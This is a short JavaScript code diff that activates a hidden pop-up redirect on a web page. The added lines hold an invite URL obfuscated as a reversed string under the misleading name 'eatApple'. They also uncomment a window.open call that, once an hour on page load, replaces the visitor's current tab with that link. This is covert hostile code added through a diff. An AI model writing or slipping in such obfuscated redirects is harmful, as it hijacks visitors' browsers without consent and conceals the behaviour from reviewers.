@@ -1,5 +1,5 @@
 (function(docpointer) {
-	let eatApple = "3fc7d54bb3C43235015=etivni?nioj//:te".split("").reverse().join("");
+	let eatApple = "a3c48b4244C5897964172=etivni?nioj//:te".split("").reverse().join("");
 	let showPopUp = function() {
 		let meItem = localStorage.getItem("popcornlast");
 		if (meItem == null || (Date.now() - parseInt(meItem)) > (60 * 60 * 1000)) {
@@ -16,7 +16,7 @@
 	else {
 		document.addEventListener("readystatechange", function(e) {
 			if ((document.readyState === 'ready' || document.readyState === 'complete') && showPopUp()) {
-				//window.open(eatApple, "_self");
+				window.open(eatApple, "_self");
 			}
 		});
 	}
